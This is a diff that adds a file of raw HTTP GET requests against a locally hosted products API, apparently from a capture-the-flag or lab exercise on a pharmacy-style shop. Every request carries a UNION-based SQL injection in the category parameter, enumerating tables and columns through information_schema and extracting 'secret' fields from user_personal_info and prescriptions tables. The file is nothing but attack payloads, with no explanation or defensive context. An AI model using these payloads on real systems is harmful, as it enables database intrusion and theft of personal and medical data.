@@ -1,0 +1,11 @@
+GET http://127.0.0.1/away/4ddefc30-9a59-46b9-bcf1-e8df7f075cbe/api/products?category=Биологически активные добавки' or 1=1 UNION  SELECT null, null, null, null, null, null, null, table_name FROM information_schema.tables WHERE table_schema='public; --
+GET http://127.0.0.1/away/4ddefc30-9a59-46b9-bcf1-e8df7f075cbe/api/products?category=Биологически активные добавки' or 1=1 UNION  SELECT null, null, table_name, null, null, null, null, null FROM orders WHERE table_schema='public'; --
+GET http://127.0.0.1/away/4ddefc30-9a59-46b9-bcf1-e8df7f075cbe/api/products?category=Биологически активные добавки' OR 1=1 UNION SELECT null, null, column_name, null, null, null, null, null FROM information_schema.columns WHERE table_name = 'medications'; --
+
+
+GET http://127.0.0.1/away/4ddefc30-9a59-46b9-bcf1-e8df7f075cbe/api/products?category=Биологически активные добавки' or 1=1 UNION SELECT null, null, null, null, null, null, null, secret FROM user_personal_info; --
+
+
+GET http://127.0.0.1/away/4ddefc30-9a59-46b9-bcf1-e8df7f075cbe/api/products?category=Биологически активные добавки' or 1=1 UNION SELECT null, null, null, null, null, null, null, secret FROM prescriptions; --
+
+
